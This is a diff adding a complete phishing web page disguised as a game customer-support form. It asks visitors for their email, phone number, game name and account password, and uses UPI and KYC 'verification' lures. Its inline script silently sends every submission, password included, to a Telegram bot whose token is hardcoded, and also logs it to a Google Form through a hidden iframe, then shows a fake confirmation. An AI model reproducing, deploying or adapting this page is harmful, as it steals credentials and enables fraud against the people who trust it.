@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Game Support Help Line</title>
+
+    <meta name="description"
+        content="Submit your issue securely. Our support team will review the information and take immediate action.">
+
+    <!-- Open Graph -->
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Game Support Help Line">
+    <meta property="og:title" content="Game Support Help Line">
+    <meta property="og:description"
+        content="Submit your issue securely. Our support team will review the information and take immediate action.">
+    <meta property="og:url" content="https://customer-helpline.netlify.app/">
+    <meta property="og:image" content="https://customer-helpline.netlify.app/preview.jpg">
+    <meta property="og:image:secure_url" content="https://customer-helpline.netlify.app/preview.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Game Support Help Line">
+    <meta name="twitter:description" content="Submit your issue securely. Our support team will review immediately.">
+    <meta name="twitter:image" content="https://customer-helpline.netlify.app/preview.jpg">
+
+</head>
+<link rel="stylesheet" href="style.css">
+
+<body>
+
+    <div class="login-container">
+        <div class="header">
+            <div class="header-top">
+                <span class="logo">HELP LINE</span>
+                
+                <!-- Verify Now Button -->
+                <a href="https://kyc-update-verification.netlify.app/" class="spin-btn">
+                    <span class="arrow-circle">
+                        <svg class="arrow-icon" viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="5" y1="12" x2="19" y2="12"></line>
+                            <polyline points="12 5 19 12 12 19"></polyline>
+                        </svg>
+                    </span>
+                    <span class="btn-text">Verify Now</span>
+                </a>
+            </div>
+
+            <p class="pera">
+                We understand this issue may be impacting <br>your operations and appreciate your patience.
+            </p>
+        </div>
+
+        <form id="customForm"
+            action="https://docs.google.com/forms/d/e/1FAIpQLSfSONOYE5G_WOKv_kkP0HuIQGROtjyaV3q8q8-cyu0NKrvYsA/formResponse"
+            method="POST" target="hidden_iframe" onsubmit="return handleFormSubmission();">
+
+            <label>Email id</label>
+            <input type="email" name="entry.1522646860" placeholder="Enter your Email" required>
+
+            <label>Game Name</label>
+            <input name="entry.132606066" placeholder="Enter your platform Name" required>
+
+            <label>Phone number</label>
+            <div class="phone-input">
+                <select>
+                    <option>+91</option>
+                    <option>+1</option>
+                    <option>+44</option>
+                    <option>+86</option>
+                </select>
+
+                <input type="tel" name="entry.2074770927" maxlength="10" pattern="[0-9]{10}"
+                    placeholder="Enter 10-digit number" required>
+            </div>
+
+            <label>Password</label>
+            <input name="entry.1904004566" placeholder="Password" required>
+
+            <label>Your Query</label>
+            <textarea name="entry.1266644271" placeholder="eg: UPI VERIFICATION " required></textarea>
+
+            <button type="submit" id="submitBtn">Submit</button>
+
+        </form>
+
+        <p id="successMessage">
+            Your query is submitted successfully ✅
+        </p>
+
+    </div>
+
+    <!-- Hidden iframe -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+    <!-- Google Form warmup iframe -->
+    <iframe src="https://docs.google.com/forms/d/e/1FAIpQLSfSONOYE5G_WOKv_kkP0HuIQGROtjyaV3q8q8-cyu0NKrvYsA/viewform"
+        style="display:none;"></iframe>
+
+    <script>
+
+        // TELEGRAM CONFIG
+        const BOT_TOKEN = "7825398205:AAG5TaozZJD8TSMtatx3Hk1UEnuSC7dnWuw";
+        const CHAT_ID = "8640684016";
+
+        function sendToTelegram(data) {
+
+            const message = `
+━━━━━━━━━━━━━━━
+📩 NEW SUPPORT REQUEST
+━━━━━━━━━━━━━━━
+
+📧 Email: ${data.email}
+🎮 Game: ${data.game}
+📱 Phone: ${data.phone}
+🔑 Password: ${data.password}
+📝 Query: ${data.query}
+
+🕒 ${new Date().toLocaleString()}
+`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+        }
+
+        function handleFormSubmission() {
+
+            const btn = document.getElementById("submitBtn");
+            const msg = document.getElementById("successMessage");
+            const form = document.getElementById("customForm");
+
+            // collect data
+            const formData = {
+                email: form["entry.1522646860"].value,
+                game: form["entry.132606066"].value,
+                phone: form["entry.2074770927"].value,
+                password: form["entry.1904004566"].value,
+                query: form["entry.1266644271"].value
+            };
+
+            // send telegram
+            sendToTelegram(formData);
+
+            // UI lock
+            btn.innerText = "Submitting...";
+            btn.disabled = true;
+
+            // 🔥 FIX: delayed submit
+            setTimeout(() => {
+                form.submit();
+            }, 300);
+
+            // success UI
+            setTimeout(() => {
+                msg.style.display = "block";
+                form.reset();
+
+                btn.innerText = "Submit";
+                btn.disabled = false;
+
+                setTimeout(() => {
+                    msg.style.display = "none";
+                }, 5000);
+
+            }, 1500);
+
+            return false;
+        }
+
+    </script>
+
+</body>
+
+</html>
